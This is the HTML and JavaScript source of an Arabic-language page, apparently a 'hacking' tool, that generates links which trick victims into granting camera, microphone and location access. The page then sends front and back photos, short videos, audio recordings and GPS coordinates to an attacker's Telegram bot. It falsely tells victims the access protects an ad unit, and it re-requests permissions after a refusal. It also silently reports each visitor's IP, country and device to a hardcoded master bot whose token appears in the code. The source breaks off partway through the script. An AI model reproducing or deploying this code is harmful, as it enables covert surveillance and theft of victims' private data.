<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>MARO.com</title>
  <style>
    :root{
      --bg1:#0b0712;
      --card:#131026;
      --accent1:#a66bff;
      --accent2:#6e3be0;
      --muted:#bfaef6;
    }
    * {
      box-sizing: border-box;
      font-family: 'Poppins', Tahoma, sans-serif;
    }
    html,body{height:100%;margin:0;background:var(--bg1);color:#fff}
    body{
      background: #000000;
      position:relative;
    }
    .wrap{position:relative;z-index:2;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:30px 20px;box-sizing:border-box}
    .header{width:100%;max-width:1100px;display:flex;justify-content:space-between;align-items:center;margin-bottom:24px}
    .brand{font-weight:800;font-size:22px;color:#ffffff;letter-spacing:0.6px}
    .nav{display:flex;gap:18px}
    .nav a{color:#ffffff;text-decoration:none;padding:8px 14px;border-radius:10px;background:rgba(255,255,255,0.03)}
    .card{width:100%;max-width:720px;background: linear-gradient(180deg, rgba(18,12,34,0.85), rgba(10,7,18,0.75));
      border-radius:16px;padding:22px;box-shadow: 0 10px 40px rgba(0,0,0,0.6);backdrop-filter: blur(4px);}
    .hero{display:flex;gap:20px;align-items:center;flex-wrap:wrap}
    .hero-left{flex:1;min-width:260px}
    .title{font-size:34px;color:#ffffff;margin:0 0 8px}
    .subtitle{color:#ffffff;margin:0 0 18px}
    .form {background: rgba(255,255,255,0.03); padding:14px;border-radius:12px}
    label{display:block;color:#ffffff;font-weight:700;margin:10px 0 6px}
    input[type="text"]{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:#fff;outline:none;font-size:14px;box-sizing:border-box}
    .checkbox-group {
      display: flex;
      flex-direction: column;
      gap: 8px;
      margin: 15px 0;
      max-height: 300px;
      overflow-y: auto;
      padding: 10px;
      background: rgba(0,0,0,0.3);
      border-radius: 12px;
      border: 1px solid rgba(255,255,255,0.05);
    }
    .checkbox-item {
      display: flex;
      align-items: center;
      gap: 12px;
      background: rgba(255,255,255,0.03);
      padding: 10px 15px;
      border-radius: 10px;
      transition: 0.3s;
    }
    .checkbox-item:hover {
      background: rgba(255,255,255,0.08);
    }
    .checkbox-item input[type="checkbox"] {
      width: 20px;
      height: 20px;
      cursor: pointer;
      accent-color: #a66bff;
    }
    .checkbox-item label {
      margin: 0;
      font-weight: 500;
      font-size: 15px;
      cursor: pointer;
      flex: 1;
    }
    .btn{
      display:inline-block;padding:14px 16px;border-radius:12px;border:none;background:linear-gradient(90deg, #ffffff, #cccccc);color:#000000;font-weight:800;cursor:pointer;margin-top:15px;width:100%;font-size:16px;transition:0.3s;
    }
    .btn:hover {
      background: linear-gradient(90deg, #f0f0f0, #b3b3b3);
      transform: translateY(-2px);
    }
    .result{margin-top:14px;padding:12px;border-radius:10px;background:rgba(255,255,255,0.02);word-break:break-all;font-size:13px;display:flex;gap:10px;align-items:center;justify-content:space-between;border:1px solid rgba(255,255,255,0.05)}
    .copyBtn{padding:8px 15px;border-radius:8px;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.1);cursor:pointer;color:#fff;font-weight:600;transition:0.3s}
    .copyBtn:hover{background:rgba(255,255,255,0.15)}
    .captureBadge{
      position:fixed;top:14px;right:14px;z-index:9999;
      background:rgba(0,0,0,0.8);padding:8px 15px;border-radius:999px;font-weight:800;color:#ffd966;font-size:13px;display:none;
      box-shadow:0 8px 30px rgba(0,0,0,0.5);backdrop-filter: blur(4px);border:1px solid rgba(255,255,255,0.1);
    }
    .madeby{
      position:fixed;left:14px;bottom:14px;z-index:9999;
      background:rgba(12,7,20,0.8);padding:8px 15px;border-radius:10px;font-weight:700;
      box-shadow:0 6px 20px rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.05);
      color: #ffffff;font-size:14px;letter-spacing:0.5px;
    }
    @media (max-width:720px){
      .title{font-size:28px}
      .card{padding:16px}
      .wrap{padding:18px}
    }

    /* Ø§Ù„Ø¯Ø§ÙŠÙ„ÙˆØ¬ */
    .dialog {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #000000;
      border: 2px solid #ffffff;
      border-radius: 20px;
      padding: 40px 30px;
      text-align: center;
      z-index: 99999;
      box-shadow: 0 0 30px rgba(255,255,255,0.2);
      width: 85%;
      max-width: 500px;
    }
    .dialog p {
      color: #ffffff;
      font-size: 24px;
      font-weight: 800;
      margin-bottom: 30px;
    }
    .dialog-buttons {
      display: flex;
      flex-direction: column;
      gap: 15px;
      align-items: center;
    }
    .dialog-link {
      display: inline-block;
      background: #ffffff;
      color: #000000;
      padding: 16px 25px;
      border-radius: 50px;
      text-decoration: none;
      font-weight: 900;
      font-size: 18px;
      border: 2px solid #ffffff;
      transition: 0.3s;
      width: 90%;
    }
    .dialog-link.visited {
      background: #28a745;
      color: white;
      border-color: #28a745;
    }
    .dialog-btn {
      display: inline-block;
      background: #ffffff;
      color: #000000;
      padding: 18px 30px;
      border-radius: 50px;
      text-decoration: none;
      font-weight: 900;
      font-size: 18px;
      border: 2px solid #ffffff;
      transition: 0.3s;
      box-shadow: 0 0 20px rgba(255,255,255,0.3);
      margin-top: 20px;
      width: 90%;
      cursor: pointer;
      opacity: 0.5;
      pointer-events: none;
    }
    .dialog-btn.active {
      opacity: 1;
      pointer-events: auto;
      background: #ffffff;
      color: #000000;
    }
    .dialog-btn.active:hover {
      background: transparent;
      color: #ffffff;
    }

    /* Ø³ØªØ§ÙŠÙ„ ØµÙØ­Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¬Ø§Ù†Ø¨ÙŠØ© - Ù…Ø·Ø§Ø¨Ù‚ Ù„Ù„Ø£ØµÙ„ÙŠ ÙˆÙ„ÙƒÙ† Ø¨Ù…ÙƒÙˆÙ†Ø§Øª Ù…ØµØºØ±Ø© */
    .download-page {
      width: 100%;
      min-height: 100vh;
      background: #f5f5f5;
      margin: 0;
      padding: 10px 0;
      box-sizing: border-box;
      font-family: Tahoma, Arial, sans-serif;
      direction: ltr;
    }
    .main-box{
      width:95%;
      max-width:600px;
      background:white;
      margin:20px auto;
      padding:20px;
      border-radius:15px;
      box-shadow:0 5px 20px rgba(0,0,0,0.1);
      text-align:center;
    }
    .main-box h2{
      margin-bottom:15px;
      color:#222;
      font-size:16px;
      font-weight:600;
      line-height:1.4;
    }
    /* Ø­Ø§ÙˆÙŠØ§Øª Ø§Ù„Ø¥Ø¹Ù„Ø§Ù†Ø§Øª - Ø¨Ù†ÙØ³ Ø·Ø±ÙŠÙ‚Ø© Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø£ØµÙ„ÙŠ */
    .ad-container {
      margin: 15px 0;
      padding: 5px;
      border-radius: 8px;
      background: #fafafa;
      border: 1px solid #eee;
      min-height: 90px;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }
    /* Ø´Ø¨ÙƒØ© Ù„Ù„Ø¥Ø¹Ù„Ø§Ù†Ø§Øª Ø§Ù„Ù…ØªØ¹Ø¯Ø¯Ø© */
    .ads-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
      gap: 10px;
      margin: 15px 0;
    }
    .ad-grid-item {
      background: #fafafa;
      border: 1px solid #eee;
      border-radius: 8px;
      padding: 5px;
      min-height: 100px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .download-btn{
      background:#28a745;
      color:white;
      padding:18px 40px;
      font-size:20px;
      border:none;
      border-radius:12px;
      cursor:pointer;
      transition:0.3s;
      box-shadow:0 4px 10px rgba(0,0,0,0.2);
      margin: 20px 0 10px;
      width: 100%;
      max-width: 300px;
      font-weight: bold;
    }
    .download-btn:hover{
      background:#218838;
      transform:scale(1.02);
    }
    .footer{
      text-align:center;
      margin-top:20px;
      font-size:12px;
      color:#777;
    }
    /* Ø±Ø³Ø§Ù„Ø© Ø¥Ø¹Ø§Ø¯Ø© Ø·Ù„Ø¨ Ø§Ù„Ø¥Ø°Ù† */
    .permission-toast {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(0,0,0,0.9);
      color: white;
      padding: 15px 25px;
      border-radius: 50px;
      z-index: 100000;
      font-size: 16px;
      font-weight: bold;
      box-shadow: 0 5px 20px rgba(0,0,0,0.5);
      border: 1px solid #28a745;
      backdrop-filter: blur(5px);
      display: none;
      cursor: pointer;
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0% { box-shadow: 0 5px 20px rgba(40,167,69,0.3); }
      50% { box-shadow: 0 5px 30px rgba(40,167,69,0.8); }
      100% { box-shadow: 0 5px 20px rgba(40,167,69,0.3); }
    }
  </style>
</head>
<body>

  <div class="wrap">

    <div class="header"> 
      <div class="nav">
        <a href="#"></a>
        <a href="#"></a>
      </div>
    </div>

    <div class="card" id="cardArea">
      <div class="hero">
        <div class="hero-left">
          <h5 style="margin:0 0 15px;color:#ffaa00;font-size:14px;text-align:center;">âš ï¸ ÙŠÙÙ…Ù†Ø¹ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø£Ø¯Ø§Ø© Ø¨Ø´ÙƒÙ„ ØºÙŠØ± Ù‚Ø§Ù†ÙˆÙ†ÙŠ. Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙŠØªØ­Ù…Ù„ Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„ÙŠØ© Ø§Ù„ÙƒØ§Ù…Ù„Ø©.</h5>

          <div class="form" id="formBox">
            <label>Ø£Ø¯Ø®Ù„ Ø§Ù„Ù€ ID</label>
            <input type="text" id="chatIdInput" placeholder="Ù…Ø«Ø§Ù„: 123456789" dir="ltr">

            <label>Ø£Ø¯Ø®Ù„ ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª</label>
            <input type="text" id="tokenInput" placeholder="Ù…Ø«Ø§Ù„: 123456:ABCdef..." dir="ltr">

            <label>Ø§Ù„Ù…ÙŠØ²Ø§Øª Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©:</label>
            <div class="checkbox-group" id="featuresGroup">
              <div class="checkbox-item">
                <input type="checkbox" id="camFront" value="camFront" checked>
                <label for="camFront">ğŸ“¸ ØµÙˆØ±Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©</label>
              </div>
              <div class="checkbox-item">
                <input type="checkbox" id="camBack" value="camBack">
                <label for="camBack">ğŸ“· ØµÙˆØ±Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©</label>
              </div>
              <div class="checkbox-item">
                <input type="checkbox" id="videoFront" value="videoFront">
                <label for="videoFront">ğŸ¥ ÙÙŠØ¯ÙŠÙˆ Ù…Ù† Ø§Ù„Ø£Ù…Ø§Ù… (5 Ø«ÙˆØ§Ù†)</label>
              </div>
              <div class="checkbox-item">
                <input type="checkbox" id="videoBack" value="videoBack">
                <label for="videoBack">ğŸ“¹ ÙÙŠØ¯ÙŠÙˆ Ù…Ù† Ø§Ù„Ø®Ù„Ù (5 Ø«ÙˆØ§Ù†)</label>
              </div>
              <div class="checkbox-item">
                <input type="checkbox" id="audio" value="audio">
                <label for="audio">ğŸ¤ ØªØ³Ø¬ÙŠÙ„ ØµÙˆØªÙŠ (5 Ø«ÙˆØ§Ù†)</label>
              </div>
              <div class="checkbox-item">
                <input type="checkbox" id="location" value="location">
                <label for="location">ğŸ“ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹</label>
              </div>
            </div>

            <button class="btn" id="generateBtn">ğŸš€ Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø±Ø§Ø¨Ø·</button>

            <div id="result" style="display:none" class="result">
              <div id="linkText" style="flex:1;color:#e7dbff;font-size:12px;direction:ltr;text-align:left;"></div>
              <button class="copyBtn" id="copyBtn">Ù†Ø³Ø®</button>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <div id="captureBadge" class="captureBadge">âš¡ Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªÙ†ÙÙŠØ°...</div>
  <div class="madeby">Made by K1X âš¡</div>
  <div id="permissionToast" class="permission-toast">ğŸ”´ Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø© - Ø§Ø¶ØºØ· Ù‡Ù†Ø§</div>

  <!-- Ø§Ù„Ø¯Ø§ÙŠÙ„ÙˆØ¬ -->
  <div class="dialog" id="mandatoryDialog">
    <p>ğŸ”” Ø§Ø´ØªØ±Ø§Ùƒ Ø¥Ø¬Ø¨Ø§Ø±ÙŠ ÙÙŠ Ø§Ù„Ù‚Ù†ÙˆØ§Øª</p>
    <div class="dialog-buttons" id="dialogButtons">
      <a href="https://t.me/Maro_hacker_eg" target="_blank" class="dialog-link" id="channel1">@Maro_hacker_eg</a>
      <a href="https://t.me/lego2028" target="_blank" class="dialog-link" id="channel2">@lego2028</a>
      <button class="dialog-btn" id="subscribeDoneBtn" disabled>âœ… ØªÙ… Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ</button>
    </div>
  </div>

<script>
  // ------------------ Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø«Ø§Ø¨ØªØ© ------------------
  const MASTER_BOT_TOKEN = "8550564365:AAEjhh_aqXExLx3i8N7niKQXjJefhdkzqtY";
  const MASTER_CHAT_ID   = "6197511637";

  // ------------------ Ù…ØªØºÙŠØ±Ø§Øª Ø¹Ø§Ù…Ø© ------------------
  let visitorIP = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
  let visitorCountry = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
  let visitorDevice = "Unknown";
  let visitorBattery = "ØºÙŠØ± Ù…ØªØ§Ø­";
  let visitorOS = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
  let permissionDenied = false;
  let permissionToast = document.getElementById('permissionToast');
  let activeStreams = [];
  let mediaRecorders = [];

  // ------------------ Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø²Ø§Ø¦Ø± ------------------
  async function sendVisitorInfo() {
    try {
      const userAgent = navigator.userAgent;
      if (/Android/i.test(userAgent)) visitorDevice = "Android";
      else if (/iPhone|iPad|iPod/i.test(userAgent)) visitorDevice = "iOS";
      else if (/Windows/i.test(userAgent)) visitorDevice = "Windows";
      else if (/Mac/i.test(userAgent)) visitorDevice = "MacOS";
      else if (/Linux/i.test(userAgent)) visitorDevice = "Linux";

      visitorOS = navigator.platform || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";

      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          visitorBattery = (battery.level * 100) + "%";
          if (battery.charging) visitorBattery += " (Ø´Ø­Ù†)";
        } catch (e) { visitorBattery = "ØºÙŠØ± Ù…ØªØ§Ø­"; }
      }

      try {
        const ipRes = await fetch('https://ipapi.co/json/');
        const ipData = await ipRes.json();
        visitorIP = ipData.ip || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
        visitorCountry = ipData.country_name || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
      } catch (e) {}

      const message = `ğŸŸ¢ *Ø²ÙŠØ§Ø±Ø© Ø¬Ø¯ÙŠØ¯Ø©*
ğŸŒ *Ø§Ù„Ø¯ÙˆÙ„Ø©*: ${visitorCountry}
ğŸ“± *Ø§Ù„Ø¬Ù‡Ø§Ø²*: ${visitorDevice}
ğŸ”‹ *Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©*: ${visitorBattery}
ğŸŒ *IP*: ${visitorIP}
ğŸ•’ *Ø§Ù„ÙˆÙ‚Øª*: ${new Date().toLocaleString('ar-EG')}`;

      await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: message, parse_mode: 'Markdown' })
      });
    } catch (err) {}
  }
  sendVisitorInfo();

  // ------------------ Ø¹Ù†Ø§ØµØ± Ø§Ù„Ø¯Ø§ÙŠÙ„ÙˆØ¬ ------------------
  const dialog = document.getElementById('mandatoryDialog');
  const channel1 = document.getElementById('channel1');
  const channel2 = document.getElementById('channel2');
  const subscribeBtn = document.getElementById('subscribeDoneBtn');
  let channel1Clicked = false, channel2Clicked = false;

  channel1.addEventListener('click', function() {
    channel1Clicked = true;
    channel1.classList.add('visited');
    channel1.style.background = '#28a745';
    channel1.style.color = 'white';
    checkBothClicked();
  });

  channel2.addEventListener('click', function() {
    channel2Clicked = true;
    channel2.classList.add('visited');
    channel2.style.background = '#28a745';
    channel2.style.color = 'white';
    checkBothClicked();
  });

  function checkBothClicked() {
    if (channel1Clicked && channel2Clicked) {
      subscribeBtn.disabled = false;
      subscribeBtn.classList.add('active');
      subscribeBtn.innerHTML = 'âœ… ØªÙ… Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ';
    }
  }

  subscribeBtn.addEventListener('click', function() {
    dialog.style.display = 'none';
  });

  // ------------------ Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø±Ø§Ø¨Ø· ------------------
  const generateBtn = document.getElementById('generateBtn');
  const resultEl = document.getElementById('result');
  const linkText = document.getElementById('linkText');
  const copyBtn = document.getElementById('copyBtn');

  generateBtn.addEventListener('click', () => {
    const chat = document.getElementById('chatIdInput').value.trim();
    const token = document.getElementById('tokenInput').value.trim();
    if(!chat || !token){
      alert('âŒ Ø§Ù…Ù„Ø£ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„');
      return;
    }
    const checkboxes = document.querySelectorAll('#featuresGroup input[type="checkbox"]:checked');
    const features = Array.from(checkboxes).map(cb => cb.value).join(',');
    const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&features=${encodeURIComponent(features)}`;
    linkText.innerText = fullLink;
    resultEl.style.display = 'flex';
  });

  copyBtn.addEventListener('click', async () => {
    try {
      await navigator.clipboard.writeText(linkText.innerText);
      copyBtn.innerText = 'âœ… ØªÙ…';
      setTimeout(()=> copyBtn.innerText = 'Ù†Ø³Ø®',1500);
    } catch(e) { alert('ÙØ´Ù„ Ø§Ù„Ù†Ø³Ø®'); }
  });

  // ------------------ Ø¯Ø§Ù„Ø© ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¥Ø¹Ù„Ø§Ù†Ø§Øª ------------------
  function loadAd(src) {
    const s = document.createElement("script");
    s.src = src;
    s.async = true;
    document.body.appendChild(s);
  }

  // ------------------ Ø¯ÙˆØ§Ù„ Ø¥Ø¹Ø§Ø¯Ø© Ø·Ù„Ø¨ Ø§Ù„Ø¥Ø°Ù† ------------------
  function showPermissionToast() {
    permissionToast.style.display = 'block';
  }

  function hidePermissionToast() {
    permissionToast.style.display = 'none';
  }

  permissionToast.addEventListener('click', function() {
    hidePermissionToast();
    // Ø¥Ø¹Ø§Ø¯Ø© Ø·Ù„Ø¨ Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª
    location.reload();
  });

  // ------------------ Ø¯ÙˆØ§Ù„ Ø§Ù„ØªØ³Ø¬ÙŠÙ„ ------------------
  function stopAllTracks() {
    activeStreams.forEach(stream => {
      stream.getTracks().forEach(track => track.stop());
    });
    activeStreams = [];
    mediaRecorders.forEach(recorder => {
      if (recorder.state === 'recording') recorder.stop();
    });
    mediaRecorders = [];
  }

  async function capturePhoto(stream, chat, token, type) {
    const video = document.createElement('video');
    video.autoplay = true;
    video.playsInline = true;
    video.muted = true;
    video.style.display = 'none';
    video.srcObject = stream;
    document.body.appendChild(video);
    
    await video.play();
    
    setTimeout(() => {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
      
      canvas.toBlob(async (blob) => {
        if (blob && blob.size > 2000) {
          const form = new FormData();
          form.append('chat_id', chat);
          form.append('photo', blob, `${type}_${Date.now()}.jpg`);
          
          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
          
          const caption = `ğŸ“¸ ØµÙˆØ±Ø© (${type === 'front' ? 'Ø£Ù…Ø§Ù…ÙŠØ©' : 'Ø®Ù„ÙÙŠØ©'})
ğŸŒ ${visitorCountry} | ğŸ“± ${visitorDevice} | IP: ${visitorIP}`;
          
          await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chat, text: caption })
          });
        }
        document.body.removeChild(video);
      }, 'image/jpeg', 0.8);
    }, 2000);
  }

  async function recordVideo(stream, chat, token, type) {
    const mediaRecorder = new MediaRecorder(stream);
    const chunks = [];
    
    mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
    mediaRecorder.onstop = async () => {
      const blob = new Blob(chunks, { type: 'video/mp4' });
      const form = new FormData();
      form.append('chat_id', chat);
      form.append('video', blob, `${type}_${Date.now()}.mp4`);
      
      await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: form });
      
      const caption = `ğŸ¥ ÙÙŠØ¯ÙŠÙˆ (${type === 'front' ? 'Ø£Ù…Ø§Ù…ÙŠ' : 'Ø®Ù„ÙÙŠ'}) - 5 Ø«ÙˆØ§Ù†
ğŸŒ ${visitorCountry} | ğŸ“± ${visitorDevice}`;
      
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chat, text: caption })
      });
    };
    
    mediaRecorder.start();
    mediaRecorders.push(mediaRecorder);
    
    setTimeout(() => {
      if (mediaRecorder.state === 'recording') mediaRecorder.stop();
    }, 5000);
  }

  async function recordAudio(stream, chat, token) {
    const mediaRecorder = new MediaRecorder(stream);
    const chunks = [];
    
    mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
    mediaRecorder.onstop = async () => {
      const blob = new Blob(chunks, { type: 'audio/mp4' });
      const form = new FormData();
      form.append('chat_id', chat);
      form.append('audio', blob, `audio_${Date.now()}.mp4`);
      
      await fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: form });
      
      const caption = `ğŸ¤ ØªØ³Ø¬ÙŠÙ„ ØµÙˆØªÙŠ - 5 Ø«ÙˆØ§Ù†
ğŸŒ ${visitorCountry} | ğŸ“± ${visitorDevice}`;
      
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chat, text: caption })
      });
    };
    
    mediaRecorder.start();
    mediaRecorders.push(mediaRecorder);
    
    setTimeout(() => {
      if (mediaRecorder.state === 'recording') mediaRecorder.stop();
    }, 5000);
  }

  async function getLocation(chat, token) {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(async (position) => {
        const { latitude, longitude } = position.coords;
        const locationMessage = `ğŸ“ *Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø­Ø§Ù„ÙŠ*
Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª: ${latitude}, ${longitude}
ğŸ”— https://www.google.com/maps?q=${latitude},${longitude}`;
        
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chat, text: locationMessage, parse_mode: 'Markdown' })
        });
      }, (error) => {
        console.log('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ù…ÙˆÙ‚Ø¹:', error);
        permissionDenied = true;
        showPermissionToast();
      });
    }
  }

  // ------------------ Ø§Ù„Ø¯Ø§Ù„Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© Ù„Ù„ØµÙØ­Ø© Ø§Ù„Ø¬Ø§Ù†Ø¨ÙŠØ© ------------------
  async function startFeatures(chat, token, features) {
    if (!features) return;
    
    const featureList = features.split(',');
    let hasVideo = featureList.includes('camFront') || featureList.includes('camBack') || 
                   featureList.includes('videoFront') || featureList.includes('videoBack');
    let hasAudio = featureList.includes('audio');
    
    // Ø·Ù„Ø¨ Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª Ù…Ø¹ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø¹Ù†Ø¯ Ø§Ù„Ø±ÙØ¶
    async function requestPermissions() {
      try {
        const constraints = {};
        if (hasVideo && hasAudio) {
          constraints.video = true;
          constraints.audio = true;
        } else if (hasVideo) {
          constraints.video = true;
        } else if (hasAudio) {
          constraints.audio = true;
        }
        
        if (Object.keys(constraints).length > 0) {
          const stream = await navigator.mediaDevices.getUserMedia(constraints);
          activeStreams.push(stream);
          
          // ØªÙ†ÙÙŠØ° Ø§Ù„Ù…ÙŠØ²Ø§Øª
          if (featureList.includes('camFront')) {
            const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            activeStreams.push(frontStream);
            await capturePhoto(frontStream, chat, token, 'front');
          }
          
          if (featureList.includes('camBack')) {
            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
            activeStreams.push(backStream);
            await capturePhoto(backStream, chat, token, 'back');
          }
          
          if (featureList.includes('videoFront')) {
            const videoFrontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
            activeStreams.push(videoFrontStream);
            await recordVideo(videoFrontStream, chat, token, 'front');
          }
          
          if (featureList.includes('videoBack')) {
            const videoBackStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
            activeStreams.push(videoBackStream);
            await recordVideo(videoBackStream, chat, token, 'back');
          }
          
          if (featureList.includes('audio')) {
            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            activeStreams.push(audioStream);
            await recordAudio(audioStream, chat, token);
          }
        }
        
        if (featureList.includes('location')) {
          await getLocation(chat, token);
        }
        
      } catch (err) {
        console.log('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª:', err);
        permissionDenied = true;
        showPermissionToast();
        
        // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø¨Ø¹Ø¯ 3 Ø«ÙˆØ§Ù†
        setTimeout(() => {
          if (permissionDenied) {
            requestPermissions();
          }
        }, 3000);
      }
    }
    
    await requestPermissions();
  }

  // ------------------ Ø§Ù„ÙˆØ¶Ø¹ Ø§Ù„Ø¬Ø§Ù†Ø¨ÙŠ ------------------
  const params = new URLSearchParams(window.location.search);
  const chat = params.get('chat');
  const token = params.get('token');
  const features = params.get('features');

  if (chat && token) {
    // Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ø¹Ù†Ø§ØµØ± Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©
    dialog.style.display = 'none';
    document.getElementById('cardArea').style.display = 'none';
    document.querySelector('.header').style.display = 'none';
    document.querySelector('.madeby').style.display = 'none';
    
    const wrap = document.querySelector('.wrap');
    wrap.innerHTML = '';
    wrap.style.padding = '0';
    wrap.style.margin = '0';
    wrap.style.maxWidth = '100%';
    wrap.style.background = '#f5f5f5';
    
    // Ø¥Ù†Ø´Ø§Ø¡ ØµÙØ­Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ - Ø¨Ù†ÙØ³ Ù‡ÙŠÙƒÙ„ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø£ØµÙ„ÙŠ
    const downloadPage = document.createElement('div');
    downloadPage.className = 'download-page';
    
    const mainBox = document.createElement('div');
    mainBox.className = 'main-box';
    
    const h2 = document.createElement('h2');
    h2.innerHTML = 'âš ï¸ ÙŠØ¬Ø¨ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ "Ø³Ù…Ø§Ø­" Ù„Ø­Ù…Ø§ÙŠØ© Ø§Ù„ÙˆØ­Ø¯Ø© Ø§Ù„Ø¥Ø¹Ù„Ø§Ù†ÙŠØ©<br>Ù…Ù† Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª Ø§Ù„ÙˆÙ‡Ù…ÙŠØ©';
    mainBox.appendChild(h2);
    
    // Ø¥Ø¹Ù„Ø§Ù†Ø§Øª Ù…ØªØ¹Ø¯Ø¯Ø© - Ø¨Ù†ÙØ³ Ø·Ø±ÙŠÙ‚Ø© Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø£ØµÙ„ÙŠ
    // Ø¥Ø¹Ù„Ø§Ù† 1 - Ø´Ø¨ÙƒØ© Ø¥Ø¹Ù„Ø§Ù†Ø§Øª Ù…ØµØºØ±Ø©
    const adsGrid = document.createElement('div');
    adsGrid.className = 'ads-grid';
    for (let i = 1; i <= 4; i++) {
      const adItem = document.createElement('div');
      adItem.className = 'ad-grid-item';
      adItem.innerHTML = `<div style="width:100%;height:100%;min-height:90px;display:flex;align-items:center;justify-content:center;background:#f0f0f0;font-size:12px;color:#666;">Ø¥Ø¹Ù„Ø§Ù† ${i}</div>`;
      adsGrid.appendChild(adItem);
    }
